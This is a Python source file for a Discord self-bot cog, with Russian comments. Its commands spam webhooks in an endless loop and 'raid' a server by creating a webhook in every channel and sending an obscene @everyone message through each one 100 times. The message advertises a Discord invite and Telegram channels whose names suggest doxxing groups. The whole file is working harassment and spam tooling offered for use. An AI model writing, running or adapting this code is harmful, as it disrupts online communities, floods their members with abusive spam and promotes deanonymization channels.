import os

try:
    import discord
except: os.system('pip install discord')

from discord.ext import commands

try:
    import colorama
except: os.system('pip install colorama')

from colorama import Fore, init

try:
    import requests
except: os.system('pip install requests')

init()

class webhooks(commands.Cog):
    def __init__(self, client):
        self.client = client
        
        
    @commands.command()
    async def webhook_send(self, ctx, url, *, arg):
        """Отправить сообщение от лица вебхука"""
        await ctx.message.delete()
        try:
            requests.post(url, json={"content": arg})
            await ctx.send('**Sucefully** :white_check_mark:')
        except: await ctx.send('Invalid webhook')
            
    @commands.command()
    async def webhook_spam(self, ctx, url, *, arg='''
@everyone
данный сервер выебан селф ботом от Neesssgz.
все участники вашей помойки переезжают сюда:
https://discord.gg/lavanbot
https://t.me/kracher223
https://t.me/russian_deanon
https://t.me/russiandeanons
https://t.me/webdeanon'''):
        """Заспамить вебхук"""
        await ctx.send('**Начат спам в вебхук**')
        while True:
            try:
                requests.post(url, json={"content": arg})
            except: pass
            
    @commands.command()
    async def hookall(self, ctx):
        """Рейд сервера вебхуками"""
        await ctx.message.delete()
        for channel in ctx.guild.channels:
            try:
                await channel.create_webhook(name='CRASHED BY NEESSSGS')
            except: pass
                
        for _ in range(100):
            for chn in ctx.guild.text_channels:
                for web in await chn.webhooks():
                    try:
                        await web.send('''
@everyone
данный сервер выебан селф ботом от Neesssgz.
все участники вашей помойки переезжают сюда:
https://discord.gg/lavanbot
https://t.me/kracher223
https://t.me/russian_deanon
https://t.me/russiandeanons
https://t.me/webdeanons                                       ''')
                    except: pass
                        
                        
def setup(client):
    client.add_cog(webhooks(client))